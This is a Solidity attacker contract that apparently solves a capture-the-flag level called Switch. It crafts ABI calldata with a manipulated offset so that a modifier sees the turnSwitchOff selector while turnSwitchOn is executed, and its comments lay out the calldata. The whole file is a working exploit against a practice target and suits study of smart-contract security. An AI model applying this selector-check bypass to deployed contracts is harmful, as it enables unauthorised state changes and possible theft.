// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./target/Switch.sol";

contract SwitchAttacker {
    Switch public target;

    constructor(address payable _target) {
        target = Switch(_target);
    }

    function attack() public returns (bool) {
        bytes memory data = abi.encodePacked(
            target.flipSwitch.selector,
            abi.encode(0x60), // offset to the size of the data
            abi.encode(0x0), // fill the 32 bytes because here is to suppose to be the length of the data
            abi.encode(target.turnSwitchOff.selector), // the modifier will check if the selector is the same as this one
            abi.encode(0x20), // size of the data
            abi.encode(target.turnSwitchOn.selector) // the function that will be called
        );

        /*

        the shape of the data will be like this:

        0x30c13ade
        0000000000000000000000000000000000000000000000000000000000000060
        0000000000000000000000000000000000000000000000000000000000000000
        20606e1500000000000000000000000000000000000000000000000000000000
        0000000000000000000000000000000000000000000000000000000000000020
        76227e1200000000000000000000000000000000000000000000000000000000

        more about this here: https://medium.com/@libertylocked/what-are-abi-encoding-functions-in-solidity-0-4-24-c1a90b5ddce8
        https://docs.soliditylang.org/en/v0.8.6/abi-spec.html
        */

        (bool success, ) = address(target).call(data);

        return success;
    }

    function getSwitchOn() public view returns (bool) {
        return target.switchOn();
    }
}
